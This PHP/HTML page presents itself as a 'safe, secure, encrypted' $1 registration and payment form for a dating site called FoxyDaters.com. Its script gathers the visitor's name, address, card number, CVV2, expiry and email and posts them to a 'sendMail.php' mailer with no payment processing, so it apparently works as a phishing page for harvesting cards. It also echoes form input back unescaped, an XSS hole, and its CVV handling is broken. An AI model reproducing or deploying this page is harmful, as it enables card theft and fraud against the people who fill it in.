
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Register</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="">
    <meta name="author" content="">

  
    <link href="css/bootstrap.css" rel="stylesheet">
    <style type="text/css">
      body {
        padding-top: 40px;
        padding-bottom: 40px;
        background-color: #f5f5f5;
      }

      .form-signin {
        max-width: 300px;
        padding: 19px 29px 29px;
        margin: 0 auto 20px;
        background-color: #fff;
        border: 1px solid #e5e5e5;
        -webkit-border-radius: 5px;
           -moz-border-radius: 5px;
                border-radius: 5px;
        -webkit-box-shadow: 0 1px 2px rgba(0,0,0,.05);
           -moz-box-shadow: 0 1px 2px rgba(0,0,0,.05);
                box-shadow: 0 1px 2px rgba(0,0,0,.05);
      }
      .form-signin .form-signin-heading,
      .form-signin .checkbox {
        margin-bottom: 10px;
      }
      .form-signin input[type="text"],
      .form-signin input[type="password"] {
        font-size: 16px;
        height: auto;
        margin-bottom: 15px;
        padding: 7px 9px;
      }
      
      .state_error{
      	color:red;
      }

    </style>
    <link href="css/bootstrap-responsive.css" rel="stylesheet">
    <script type="text/javascript" src="js/jquery-1.9.1.js"></script>
    <script type="text/javascript" src="js/bootstrap.min.js"></script>

    
    
  </head>

  <body>

    <div class="container">
	  <?php
	  	if(isset($_POST['continue'])){
	  		?>
	  		
	  		<form class="form-signin" action="index.php" method="post">
	  			<script type="text/javascript">
			$(function(){
				
				
				$('button[name="submit"]').click(function(e){
					
					$('.state_error').empty()
				var pattern = /^\w+@[a-zA-Z_]+?\.[a-zA-Z]{2,3}$/;
				var error = '';
					if($('input[name="fname"]').val()==''){
						error +="* First name required <br/>";
					}
					if($('input[name="lname"]').val()==''){
						error +="* Last name required <br/>";
					}
					
					if($('input[name="city"]').val()==''){
						error +="* City name required <br/>";
					}
					
					
					
					if($('input[name="state"]').val()==''){
						error +="* State name required <br/>";
					}
					
					
					
					
					if($('input[name="cardnumber"]').val()==''){
						error +="* Card number required <br/>";
					}
					
					if($('input[name="vv2"]').val()==''){
						error +="* VV@ required <br/>";
					}
					
					if($('input[name="year"]').val()==''){
						error +="* Year required <br/>";
					}
					
					if($('input[name="month"]').val()==''){
						error +="* Month required <br/>";
					}
					
					if($('input[name="email"]').val()==''){
						error +="* Valid Email required <br/>";
					}
					
					
					if(error==''){
						var data = "name="+$('input[name="fname"]').val()+" "+$('input[name="lname"]').val();
						data +="&city="+$('input[name="city"]').val();
						data +="&state="+$('input[name="state"]').val();
						data +="&zip="+$('input[name="zip"]').val();
						data +="&con="+$('.select option:selected').text();
						data +="&card="+$('input[name="cardnumber"]').val();
						data +="&vv2="+$('input[name="cardnumber"]').val();
						data +="&year="+$('input[name="year"]').val();
						data +="&month="+$('input[name="month"]').val();
						data +="&email="+$('input[name="email"]').val();
						
						$(".form-signin").find('.forms').hide();
						$(".form-signin").append('<h1 style="color:green" class="state_success">Sending....</h1>')
						
						$.ajax({
							url:"sendMail.php",
							type:"POST",
							dataType:"json",
							data: data,
							success:function(ret){
								if(ret['status']){
									$(".form-signin").find('.state_success').html("Send");
								}else{
									$(".form-signin").find('.state_success').style("color","red").html("Failed");
								}
							}
						});
						
						return false;
					}else{
						error = '<h5>Fix the errors below</h5>'+error;
						$('.state_error').append(error);
						return false;
					}
				});
			});
		</script>
		<div class="forms">	
        <h3 class="form-signin-heading form-2">SAFE SECURE ENCRYPTED</h3>
        <h4>Today's charge is $1.00 for 3 days.</h4>
        <p>For your access to www.FoxyDaters.com</p>
        <p><img src="img/visa.png" /></p>
        <p class=" state_error"></p>
        <p>&nbsp;</p>
        <p>First Name</p>
        <input type="text" class="input-block-level" name="fname" value="<?php echo $_POST['fname']; ?>">
        <p>Last Name</p>
        <input type="text" class="input-block-level" name="lname" value="<?php echo $_POST['lname']; ?>">
        <p>City</p>
        <input type="text" class="input-block-level" name="city">
        <p>State</p>
        <input type="text" class="input-block-level" name="state">
        <p>Country</p>
        <select name="country" class="select"> 	
  			  <option value="AX">Aeland Islands</option>
   
              <option value="AF">Afghanistan</option>
   
              <option value="AL">Albania</option>
   
              <option value="DZ">Algeria</option>
   
              <option value="AS">American Samoa</option>
   
              <option value="AD">Andorra</option>
   
              <option value="AO">Angola</option>
   
              <option value="AI">Anguilla</option>
   
              <option value="AQ">Antarctica</option>
   
              <option value="AG">Antigua And Barbuda</option>
   
              <option value="AR">Argentina</option>
   
              <option value="AM">Armenia</option>
   
              <option value="AW">Aruba</option>
   
              <option value="AU">Australia</option>
   
              <option value="AT">Austria</option>
   
              <option value="AZ">Azerbaijan</option>
   
              <option value="BS">Bahamas</option>
   
              <option value="BH">Bahrain</option>
   
              <option value="BD">Bangladesh</option>
   
              <option value="BB">Barbados</option>
               
 
                          <option value="BE">Belgium</option>
   
              <option value="BZ">Belize</option>
   
              <option value="BJ">Benin</option>
   
              <option value="BM">Bermuda</option>
   
              <option value="BT">Bhutan</option>
   
              <option value="BO">Bolivia</option>
   
              <option value="BQ">Bonaire, Saint Eustatius and Saba</option>
   
              <option value="BA">Bosnia And Herzegowina</option>
   
              <option value="BW">Botswana</option>
   
              <option value="BV">Bouvet Island</option>
   
              <option value="BR">Brazil</option>
   
              <option value="IO">British Indian Ocean</option>
   
              <option value="BN">Brunei Darussalam</option>
   
              <option value="BG">Bulgaria</option>
   
              <option value="BF">Burkina Faso</option>
   
              <option value="BI">Burundi</option>
   
              <option value="KH">Cambodia</option>
   
              <option value="CM">Cameroon</option>
   
              <option value="CA">Canada</option>
   
              <option value="CV">Cape Verde</option>
   
              <option value="KY">Cayman Islands</option>
   
              <option value="CF">Central African Republic</option>
   
              <option value="TD">Chad</option>
   
              <option value="CL">Chile</option>
   
              <option value="CN">China</option>
   
              <option value="CX">Christmas Island</option>
   
              <option value="CC">Cocos (keeling) Islands</option>
   
              <option value="CO">Colombia</option>
   
              <option value="KM">Comoros</option>
               
 
                          <option value="CK">Cook Islands</option>
   
              <option value="CR">Costa Rica</option>
   
              <option value="HR">Croatia</option>
   
              <option value="CW">Curacao</option>
   
              <option value="CY">Cyprus</option>
   
              <option value="CZ">Czech Republic</option>
   
              <option value="DK">Denmark</option>
   
              <option value="DJ">Djibouti</option>
   
              <option value="DM">Dominica</option>
   
              <option value="DO">Dominican Republic</option>
   
              <option value="TL">Timor-Leste</option>
   
              <option value="EC">Ecuador</option>
   
              <option value="EG">Egypt</option>
   
              <option value="SV">El Salvador</option>
   
              <option value="GQ">Equatorial Guinea</option>
   
              <option value="ER">Eritrea</option>
   
              <option value="EE">Estonia</option>
   
              <option value="ET">Ethiopia</option>
   
              <option value="FK">Falkland Islands</option>
   
              <option value="FO">Faroe Islands</option>
   
              <option value="FJ">Fiji</option>
   
              <option value="FI">Finland</option>
   
              <option value="FR">France</option>
   
              <option value="GF">French Guiana</option>
   
              <option value="FX">France, Metropolitan</option>
   
              <option value="PF">French Polynesia</option>
   
              <option value="TF">French Southern Territories</option>
   
              <option value="GA">Gabon</option>
   
              <option value="GM">Gambia</option>
   
              <option value="GE">Georgia</option>
   
              <option value="DE">Germany</option>
   
              <option value="GH">Ghana</option>
   
              <option value="GI">Gibraltar</option>
   
              <option value="GR">Greece</option>
   
              <option value="GL">Greenland</option>
   
              <option value="GD">Grenada</option>
   
              <option value="GP">Guadeloupe</option>
   
              <option value="GU">Guam</option>
   
              <option value="GT">Guatemala</option>
   
              <option value="GG">Guernsey</option>
   
              <option value="GN">Guinea</option>
   
              <option value="GW">Guinea-bissau</option>
   
              <option value="GY">Guyana</option>
   
              <option value="HT">Haiti</option>
   
              <option value="HM">Heard And Mc Donald Isl.</option>
   
              <option value="HN">Honduras</option>
   
              <option value="HK">Hong Kong</option>
   
              <option value="HU">Hungary</option>
   
              <option value="IS">Iceland</option>
   
              <option value="IM">Isle of Man</option>
   
              <option value="IN">India</option>
   
              <option value="ID">Indonesia</option>
               
 
 
                          <option value="IE">Ireland</option>
   
              <option value="IL">Israel</option>
   
              <option value="IT">Italy</option>
   
              <option value="JM">Jamaica</option>
   
              <option value="JP">Japan</option>
   
              <option value="JE">Jersey</option>
   
              <option value="JO">Jordan</option>
   
              <option value="KZ">Kazakhstan</option>
   
              <option value="KE">Kenya</option>
   
              <option value="KI">Kiribati</option>
   
              <option value="KW">Kuwait</option>
   
              <option value="KG">Kyrgyzstan</option>
   
              <option value="LA">Lao People's Democratic Republic</option>
   
              <option value="LV">Latvia</option>
   
              <option value="LS">Lesotho</option>
               
 
                          <option value="LY">Libyan Arab Jamahiriya</option>
   
              <option value="LI">Liechtenstein</option>
   
              <option value="LT">Lithuania</option>
   
              <option value="LU">Luxembourg</option>
   
              <option value="MO">Macau</option>
   
              <option value="MK">Macedonia</option>
   
              <option value="MG">Madagascar</option>
   
              <option value="MW">Malawi</option>
   
              <option value="MY">Malaysia</option>
   
              <option value="MV">Maldives</option>
   
              <option value="ML">Mali</option>
   
              <option value="MT">Malta</option>
   
              <option value="MH">Marshall Islands</option>
   
              <option value="MQ">Martinique</option>
   
              <option value="MR">Mauritania</option>
   
              <option value="MU">Mauritius</option>
   
              <option value="YT">Mayotte</option>
   
              <option value="MX">Mexico</option>
   
              <option value="FM">Micronesia</option>
   
              <option value="MD">Moldova, Republic Of</option>
   
              <option value="MC">Monaco</option>
   
              <option value="MN">Mongolia</option>
   
              <option value="ME">Montenegro</option>
   
              <option value="MS">Montserrat</option>
   
              <option value="MA">Morocco</option>
   
              <option value="MZ">Mozambique</option>
   
              <option value="MM">Myanmar</option>
   
              <option value="NA">Namibia</option>
   
              <option value="NR">Nauru</option>
   
              <option value="NP">Nepal</option>
   
              <option value="NL">Netherlands</option>
   
              <option value="AN">Netherlands Antilles</option>
   
              <option value="NC">New Caledonia</option>
   
              <option value="NZ">New Zealand</option>
   
              <option value="NI">Nicaragua</option>
   
              <option value="NE">Niger</option>
   
              <option value="NG">Nigeria</option>
   
              <option value="NU">Niue</option>
   
              <option value="NF">Norfolk Island</option>
   
              <option value="MP">Northern Mariana Islands</option>
   
              <option value="NO">Norway</option>
   
              <option value="OM">Oman</option>
   
              <option value="PK">Pakistan</option>
   
              <option value="PW">Palau</option>
   
              <option value="PS">Palestinian Territory, Occupied</option>
   
              <option value="PA">Panama</option>
   
              <option value="PG">Papua New Guinea</option>
   
              <option value="PY">Paraguay</option>
   
              <option value="PE">Peru</option>
   
              <option value="PH">Philippines</option>
   
              <option value="PN">Pitcairn</option>
   
              <option value="PL">Poland</option>
   
              <option value="PT">Portugal</option>
   
              <option value="PR">Puerto Rico</option>
   
              <option value="QA">Qatar</option>
   
              <option value="RE">Reunion</option>
   
              <option value="RO">Romania</option>
   
              <option value="RU">Russian Federation</option>
   
              <option value="RW">Rwanda</option>
   
              <option value="KN">Saint Kitts And Nevis</option>
   
              <option value="BL">Saint Bartelemey</option>
   
              <option value="MF">Saint Martin</option>
   
              <option value="LC">Saint Lucia</option>
   
              <option value="VC">Saint Vincent, The Grenadines</option>
   
              <option value="WS">Samoa</option>
   
              <option value="SM">San Marino</option>
   
              <option value="ST">Sao Tome And Principe</option>
   
              <option value="SA">Saudi Arabia</option>
   
              <option value="SN">Senegal</option>
   
              <option value="CS">Serbia and Montenegro</option>
   
              <option value="RS">Serbia</option>
   
              <option value="SC">Seychelles</option>
   
              <option value="SL">Sierra Leone</option>
   
              <option value="SG">Singapore</option>
   
              <option value="SX">Sint Maarten</option>
   
              <option value="SK">Slovakia (slovak Republic)</option>
   
              <option value="SI">Slovenia</option>
   
              <option value="SB">Solomon Islands</option>
   
              <option value="ZA">South Africa</option>
   
              <option value="GS">South Georgia, South Sandwich Isl.</option>
   
              <option value="ES">Spain</option>
   
              <option value="LK">Sri Lanka</option>
   
              <option value="SH">St. Helena</option>
   
              <option value="PM">St. Pierre And Miquelon</option>
               
 
                          <option value="SR">Suriname</option>
   
              <option value="SJ">Svalbard And Jan Mayen Islands</option>
   
              <option value="SZ">Swaziland</option>
   
              <option value="SE">Sweden</option>
   
              <option value="CH">Switzerland</option>
   
              <option value="TW">Taiwan</option>
   
              <option value="TJ">Tajikistan</option>
   
              <option value="TZ">Tanzania, United Republic Of</option>
   
              <option value="TH">Thailand</option>
   
              <option value="TG">Togo</option>
   
              <option value="TK">Tokelau</option>
   
              <option value="TO">Tonga</option>
   
              <option value="TT">Trinidad And Tobago</option>
   
              <option value="TN">Tunisia</option>
   
              <option value="TR">Turkey</option>
   
              <option value="TM">Turkmenistan</option>
   
              <option value="TC">Turks And Caicos Islands</option>
   
              <option value="TV">Tuvalu</option>
   
              <option value="UG">Uganda</option>
   
              <option value="UA">Ukraine</option>
   
              <option value="AE">United Arab Emirates</option>
   
              <option value="GB">United Kingdom</option>
   
              <option value="US">United States</option>
   
              <option value="UM">United States Minor Outlying Isl.</option>
   
              <option value="UY">Uruguay</option>
   
              <option value="UZ">Uzbekistan</option>
   
              <option value="VU">Vanuatu</option>
   
              <option value="VA">Vatican City State</option>
   
              <option value="VE">Venezuela</option>
   
              <option value="VN">Viet Nam</option>
   
              <option value="VG">Virgin Islands (british)</option>
   
              <option value="VI">Virgin Islands (u.s.)</option>
   
              <option value="WF">Wallis, Futuna Islands</option>
   
              <option value="EH">Western Sahara</option>
   
              <option value="YE">Yemen</option>
   
              <option value="ZM">Zambia</option>
		</select>
		<p>Zip / Postal code</p>
        <input type="text" class="input-block-level" name="zip" value="<?php echo $_POST['zip']; ?>">
        <hr/>
        <p>&nbsp;</p>
        <p>Card Number</p>
        <input type="text" class="input-block-level" name="cardnumber">
        <p>CVV2</p>
        <input type="text" class="input-block-level" name="cvv2">
        <p>Expiration :</p>
        <p><input type="text" class="input-small" name="month" />
        	<input type="text" class="input-small" name="year" />
        </p>
        <p>Email</p>
        <input type="email" required="" class="input-block-level" name="email"  value="<?php echo $_POST['email']; ?>">
        <p>(Login will be sent to this email)</p>
        
        <button class="btn btn-large btn-primary input-block-level" type="submit" name="submit">Send</button>
        </div>
      </form>
	  		
	  		<?php
			
	  		
	  	} else{
	  	
		?>
		<script type="text/javascript">
			$(function(){
				
				$('button[type="submit"]').click(function(){
					$('.state_error').empty()
				var pattern = /^\w+@[a-zA-Z_]+?\.[a-zA-Z]{2,3}$/;
				var error = '';
					if($('input[name="fname"]').val()==''){
						error +="* First name required <br/>";
					}
					if($('input[name="lname"]').val()==''){
						error +="* Last name required <br/>";
					}
					if($('input[name="zip"]').val()==''){
						error +="* Zip required <br/>";
					}
					if($('input[name="email"]').val()==''){
						error +="* Valid Email required <br/>";
					}
					
					if(error==''){
						return;
					}else{
						error = '<h5>Fix the errors below</h5>'+error;
						$('.state_error').append(error);
						return false;
					}
				});
			});
		</script>	
		<form class="form-signin" action="index.php" method="post">
        <h2 class="form-signin-heading">Registration Process</h2>
        <p class="state_error"></p>
        <h4>Fill this form out for quick access:</h4>
        <p>&nbsp;</p>
        <p>First Name</p>
        <input type="text" class="input-block-level" name="fname">
        <p>Last Name</p>
        <input type="text" class="input-block-level" name="lname">
        <p>Zip / Postal Code</p>
        <input type="text" class="input-block-level" name="zip">
        <p>Email</p>
        <input type="email" required="" class="input-block-level" name="email">
        <p>(Login will be sent to this email)</p>
        <label class="checkbox">
          <input type="checkbox" value="remember-me" name="credi-card"> $1.00 ACCOUNT - Credit Card
        </label>
        <button class="btn btn-large btn-primary" type="submit" name="continue">Continue >>></button>
      </form>
	
			
	<?php	
	  	}
	  ?>	
      
    </div> 
  </body>
</html>
